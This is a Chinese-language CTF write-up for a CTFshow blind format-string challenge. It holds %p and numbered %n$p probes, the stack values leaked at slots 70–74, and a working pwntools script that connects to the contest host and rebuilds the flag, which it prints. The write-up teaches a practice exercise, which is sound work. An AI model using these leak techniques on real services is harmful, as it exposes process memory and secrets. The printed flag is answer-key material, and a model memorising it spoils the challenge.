# CTFshow Format String 28114 WP

## 题目信息

- 目标：`pwn.challenge.ctf.show:28114`
- 附件：无，题目明确要求黑盒盲打
- 类型：格式化字符串、栈上信息泄露
- 提示：`Flag is on Stack !`
- Flag：`ctfshow{W0w_y0u_c@n_r3@11y_d@nce!}`

## 黑盒探测

连接服务后，服务先输出一段题目信息，随后直接处理用户输入。发送普通格式化字符串：

```text
%p.%p.%p.%p.%p
```

得到类似输出：

```text
0x7fff33652a80.0x200.0x7f14acbb6031.0x46.0x7f14ad0bc4c0
```

这说明用户输入被当成了 `printf` 的格式字符串，而不是作为普通字符串打印，存在格式化字符串漏洞。

题目提示 flag 在栈上，所以不需要修改 GOT 或控制程序流，只要用 `%p` 泄露栈上的内容即可。

## 定位参数偏移

为了定位格式字符串本身和 flag，在一次请求中发送带参数编号的探针：

```python
b"|".join(f"%{i}$p".encode() for i in range(1, 80))
```

前面的参数中可以看到输入字符串自身的字节，例如：

```text
0x2432257c70243125
```

将其按小端序拆开就是格式字符串中的 ASCII 字节。这说明栈参数已经被成功遍历。

继续查看后面的参数，发现第 70 个参数开始出现：

```text
%70$p = 0x7b776f6873667463
%71$p = 0x5f7530795f773057
%72$p = 0x314033725f6e4063
%73$p = 0x65636e40645f7931
%74$p = 0x7d21
```

每个 `%p` 泄露的是一个 8 字节整数，必须按 little-endian 还原为 ASCII：

```python
from pwn import p64

values = [
    0x7b776f6873667463,
    0x5f7530795f773057,
    0x314033725f6e4063,
    0x65636e40645f7931,
    0x7d21,
]

print(b"".join(p64(x).rstrip(b"\x00") for x in values))
```

输出为：

```text
ctfshow{W0w_y0u_c@n_r3@11y_d@nce!}
```

逐项对应关系如下：

| 参数 | 泄露值 | 小端还原结果 |
| --- | --- | --- |
| `%70$p` | `0x7b776f6873667463` | `ctfshow{` |
| `%71$p` | `0x5f7530795f773057` | `W0w_y0u_` |
| `%72$p` | `0x314033725f6e4063` | `c@n_r3@1` |
| `%73$p` | `0x65636e40645f7931` | `1y_d@nce` |
| `%74$p` | `0x7d21` | `!}` |

## 最小化验证脚本

下面脚本不依赖附件，直接连接服务，读取第 70 至 74 个栈参数并还原 flag：

```python
from pwn import *

context.log_level = "error"

io = remote("pwn.challenge.ctf.show", 28114)
io.recvrepeat(0.2)

probe = b"|".join(f"%{i}$p".encode() for i in range(70, 75))
io.sendline(probe)

out = io.recvrepeat(1)
line = next(line for line in out.splitlines() if line.startswith(b"0x"))
values = [int(x, 16) for x in line.split(b"|")]
flag = b"".join(p64(x).rstrip(b"\x00") for x in values)
print(flag.decode())
```

运行结果：

```text
ctfshow{W0w_y0u_c@n_r3@11y_d@nce!}
```

## 总结

本题不需要附件，也不需要 libc 或 ELF 分析。通过 `%p` 确认输入被当作格式字符串处理，再用带编号的 `%n$p` 扫描栈。题目提示 flag 在栈上，第 70 个参数开始正好是 flag 内容；由于 64 位参数以 8 字节整数输出，最后按 little-endian 转回 ASCII 即可。
